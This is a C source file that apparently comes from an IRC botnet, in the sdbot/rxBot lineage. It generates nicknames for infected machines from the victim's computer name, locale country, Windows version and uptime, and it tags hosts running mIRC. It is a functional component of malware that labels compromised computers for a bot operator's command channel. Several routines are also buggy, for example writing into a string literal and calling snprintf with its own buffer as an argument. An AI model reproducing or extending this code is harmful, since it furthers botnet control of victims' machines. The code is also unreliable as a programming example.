#include "../h/includes.h"
#include "../h/functions.h"
#include "../h/externs.h"

RNICK rnick[]={
	#ifndef NO_REALNICK
	{"real", REALNICK, rndnickreal},
	#endif
	#ifndef NO_REALNICK
	{"bothead", BOTHEAD, rndnickbothead},
	#endif
	#ifndef NO_GNAME
	{"gnick", GNICK, generatenick},
	#endif
//	{"prefix", PREFIX, prefixnick},
	{"const", CONSTNICK, rndnickconst},
	{"id", IDNICK, rndnickid},
	{"letter", LETTERNICK, rndnickletter},
	{"comp", COMPNICK, rndnickcomp},
	{"country", COUNTRYNICK, rndnickcountry},
	{"os", OSNICK, rndnickos}

};

char *rndnick(char *strbuf, int type, BOOL prefix, char *name)
{
	for (int i=0; i < (sizeof(rnick) / sizeof(RNICK)); i++)
		if ((name)?(strcmp(name,rnick[i].name)==0):(rnick[i].type == type)) {
			rnick[i].rnfunc(strbuf);
			break;
		}

	return ((prefix)?(prefixnick(strbuf)):(strbuf));
}

#ifndef NO_REALNICK
#include "nicklist.h"

char *rndnickreal(char *strbuf)
{
	srand(GetTickCount());

    _snprintf(strbuf, MAXNICKLEN, "%s", nicklist[rand()%(sizeof(nicklist) / sizeof(char *))]);

    for (int i=0;i < maxrand;i++)
		_snprintf(strbuf, MAXNICKLEN, "%s%i", strbuf, rand()%10);

	return (strbuf);
}
#endif

char *rndnickconst(char *strbuf)
{
	srand(GetTickCount());

	_snprintf(strbuf, MAXNICKLEN, "%s", nickconst);

    for (int i=0;i < maxrand;i++)
		_snprintf(strbuf, MAXNICKLEN, "%s%i", strbuf, rand()%10);

	return (strbuf);
}

char *rndnickid(char *strbuf)
{
	srand(GetTickCount());

	_snprintf(strbuf, MAXNICKLEN, "[%s]", botid);

    for (int i=0;i < maxrand;i++)
		_snprintf(strbuf, MAXNICKLEN, "%s%i", strbuf, rand()%10);

	return (strbuf);
}


char *rndnickletter(char *strbuf)
{
    srand(GetTickCount());

	int randlen = (rand()%3)+maxrand;

	for (int i=0; i < randlen; i++)
		strbuf[i] = (rand()%26)+97;
	strbuf[i] = '\0';

	return (strbuf);
}

char *rndnickcomp(char *strbuf)
{
    int i;

    LPTSTR lpszCompName="PC";
    DWORD cchBuff = 256;
	BOOL NameGood = FALSE;

    srand(GetTickCount());

	if(!GetComputerName(lpszCompName, &cchBuff))
		lpszCompName="PC";

	for (i=65;i<91;i++)
		if (lpszCompName[0] == i)
			NameGood = TRUE;
    for (i=97;i<123;i++)
		if (lpszCompName[0] == i)
			NameGood = TRUE;
    if (!NameGood)
		lpszCompName="PC";
    _snprintf(strbuf, MAXNICKLEN, lpszCompName);

    for (i=0;i < maxrand;i++)
		_snprintf(strbuf, MAXNICKLEN, "%s%i", strbuf, rand()%10);

	return (strbuf);
}

char *rndnickcountry(char *strbuf)
{
	char temp[10];

    srand(GetTickCount());

	GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME, temp, sizeof(temp));
	_snprintf(strbuf, MAXNICKLEN, "%s-", temp);

    for (int i=0;i < maxrand;i++)
		_snprintf(strbuf, MAXNICKLEN, "%s%i", strbuf, rand()%10);

	return (strbuf);
}

char *rndnickos(char *strbuf)
{
	char *os="";
	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&verinfo);

	srand(GetTickCount());

	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = "95";
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "98";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "ME";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "2K";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "XP";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) os = "2K3";
	else os = "???";

	_snprintf(strbuf,MAXNICKLEN,"[%s]|",os);

    for (int i=0;i < maxrand;i++)
		_snprintf(strbuf, MAXNICKLEN, "%s%i", strbuf, rand()%10);

	return (strbuf);
}

char *prefixnick(char *strbuf)
{
	char tmpbuf[MAXNICKLEN];

//	unsigned int days = GetTickCount() / 3600000;//1 hour test line
	unsigned int days = GetTickCount() / 86400000;//actual day
	if (days >= daysup)

		#ifndef NO_MIRCNICK
		if (days >9)
			_snprintf(tmpbuf, sizeof(tmpbuf),"[%d%s|", days, ((fFindWindow("mIRC",0))?("|M"):("")));
		else
			_snprintf(tmpbuf, sizeof(tmpbuf),"[0%d%s|", days, ((fFindWindow("mIRC",0))?("|M"):("")));
	else
		sprintf(tmpbuf, ((fFindWindow("mIRC",0))?("[M|"):("")));
		#else
		if (days >9)
			_snprintf(tmpbuf, sizeof(tmpbuf),"[%d|", days);
		else
			_snprintf(tmpbuf, sizeof(tmpbuf),"[0%d|", days);
		#endif
/*
		#ifndef NO_MIRCNICK
		_snprintf(tmpbuf, sizeof(tmpbuf),"[`%d]%s", days, ((fFindWindow("mIRC",0))?("[M]"):("")));
	else
		sprintf(tmpbuf, ((fFindWindow("mIRC",0))?("[M]"):("")));
		#else
		_snprintf(tmpbuf, sizeof(tmpbuf),"[`%d]", days);
		#endif

	if (strlen(tmpbuf) > 2) {
		strncat(tmpbuf, strbuf, sizeof(tmpbuf));
		strncpy(strbuf, tmpbuf, MAXNICKLEN);
	}

*/
	if (strlen(tmpbuf) > 2) {
		strncat(tmpbuf, strbuf, sizeof(tmpbuf));
		strncpy(strbuf, tmpbuf, MAXNICKLEN);
	}

	return (strbuf);
};

#ifndef NO_GNAME
// 'realistic random nick' example code by [sd]-- rewrite by r3v to generate better random realistic names
// if you add items to the list, update NUM_PARTx accordingly.
// this a little messy-- needs check against max nick length
	 #define NUM_PART1 21 //if u add one down there add 1 to # also.
	 #define NUM_PART2 32
	 #define NUM_PART3 5
	 #define NUM_PART4 5

char * generatenick(char * strbuf) {//beginning rewrite
		char *part1[NUM_PART1] = { //plain letters
			"b", "c", "d", "f", "g",
			"h", "j", "k", "l", "m",
			"n", "p", "q", "r", "s",
			"t", "v", "w", "x", "y",
			"z"
		};
		char *part2[NUM_PART2] = {
			"br", "bl", "ck", "cr", "cl", "ch", "dr", "fr", "fl", "gr",
			"gl", "gn", "kr", "kn", "pr", "pl", "ph", "pl", "qu", "rh",
			"st", "sp", "sw", "sk", "sc", "sv", "sn", "sm", "tr", "th",
			"vl",  "wh"
		};
		char *part3[NUM_PART3] = { "a", "e", "i", "o", "u"};
		char *part4[NUM_PART4] = { "123", "666", "69", "13", "7" };
	//gotta rewrite the whole odds and just mix it up somehow--
		// add sets like "ck" that wont start but may end
	// add a chance of break out every step after step 4
		// after break like 20% chance of number ending
		/*
	1. vowel starts? 20% chance(if not next steps write first letter)
	2. 50/50 for now = p1/p2
	3. vowel
	4. 50/50 = (random between p1/p2) or (opposite p1/p2)
	5. vowel ?80% chance or nada
	6. 50/50 p1/p2
	- maybe just use sum randoms into switches- um rand number of selects then random to selec t from each
		*/
		char fnick[128];
		memset(&fnick, 0, sizeof(fnick));
		int loops = (rand()%9 + 3); // max number of parts 2-11 for now- add sum kinda max nick length shit in here-
		//um basically max number parts = max nick length- buit maybe kinda odds of the chance of the multi letters taken into account
//		int selector;

		#ifdef DEBUG_LOGGING
		debuglog(("preloop fnick %s loops %i", fnick, loops),FALSE);
		#endif

/*
		for (int i=0;i <= MAXNICKLEN;i=sizeof(fnick)) {


			int selector = (rand()%4);
			switch(selector) {
			case 1:
				strcat(fnick, part1[rand()%NUM_PART1]);
				break;
			case 2:
				strcat(fnick, part2[rand()%NUM_PART1]);
				break;
			case 3:
				strcat(fnick, part3[rand()%NUM_PART1]);
				break;
			default:
				break;
			}


			_snprintf(strbuf, MAXNICKLEN, "%s%i", strbuf, rand()%10);
		}
*/

/*		if (rand()%6 == 0) { strcat(fnick, part1[rand()%NUM_PART1]); }// first part (1 in 6 chance)
		//	if (!loops) strcat(fnick, "_");
		strcat(fnick, part2[rand()%NUM_PART2]); // second part (always used)
		if (!loops) strcat(fnick, "_");
		strcat(fnick, part3[rand()%NUM_PART3]); // third part (always used)*/

		if (rand()%3 == 0) { // fourth part (1 in 3 or is it 4 chance)
			if (rand()%2 == 0 && loops) strcat(fnick, "_"); // underscore before number (1 in 2 chance)
			strcat(fnick, part4[rand()%NUM_PART4]);
		}

		strcpy(strbuf, fnick);
		return strbuf;
}
#endif


#ifndef NO_BOTHEAD//finished enough to work
 char * rndnickbothead(char *strbuf)//fix me-- the odds are even for the eyes that have duplicates as alternates
 {
	 #define NUM_EARS 14 //if u add one down there add 1 to # also.
	 #define NUM_HEAD 8
	 #define NUM_EYES 13
	#define NUM_MOUTH 2

//ear	 } { v ^
//matched sets ought to have even numbers--coulda made pairs in [1] [2] then if modulus == 0 -1 else +1 for match
	 //blank ear =  equal chance of no ear as any other ear
		char *lear[NUM_EARS] =		{ " ", "_", "d", "b", "p", "q", "o", "u", "O", "0", "{", "}", "v", "^" };
		char *rear[NUM_EARS] =		{ " ", "_", "b", "d", "q", "p", "o", "u", "O", "0", "}", "{", "v", "^" };

		char *lhead[NUM_HEAD] =		{ "[", "]", "{", "}", "|", "I", "L", "T" };
		char *rhead[NUM_HEAD] =		{ "]", "[", "}", "{", "|", "I", "L", "T" };

		char *mouth[NUM_MOUTH] =	{ "_", "__" };

// the eyes either match, or picks from the other 2 arrays-- i like em at least semi similar :P
		char *eye1[NUM_EYES] =		{ "^", "o", "O", "0", "X", "x", "b", "d", "q", "p", "9", "6", "u" };
		char *eye2[NUM_EYES] =		{ "^", "0", "o", "O", "x", "X", "d", "b", "p", "q", "9", "9", "u" };
		char *eye3[NUM_EYES] =		{ "^", "O", "0", "o", "x", "X", "d", "b", "p", "q", "6", "9", "u" };

		char fnick[128];
		memset(&fnick, 0, sizeof(fnick));

//pick the parts
		int eyes=rand()%NUM_EYES;
		int ears=rand()%NUM_EARS;
		int head=rand()%NUM_HEAD;

		strcat(fnick, lear[ears]);
		strcat(fnick, lhead[head]);
		strcat(fnick, eye1[eyes]);// first eye
		strcat(fnick, mouth[rand()%NUM_MOUTH]);
//the eyes are a little screwy
			if (rand()%3 == 0)
				strcat(fnick, eye1[eyes]);//1 in 3 chance- same as first
			else if (rand()%2 == 0)
				strcat(fnick, eye2[eyes]);//1 in 2 chance- cuz the 3rd chance was eliminated
			else
				strcat(fnick, eye3[eyes]);//3rd times the charm

		strcat(fnick, rhead[head]);
		strcat(fnick, rear[ears]);
//pack it up and ship it out
		strcpy(strbuf, fnick);
		return strbuf;
}
#endif

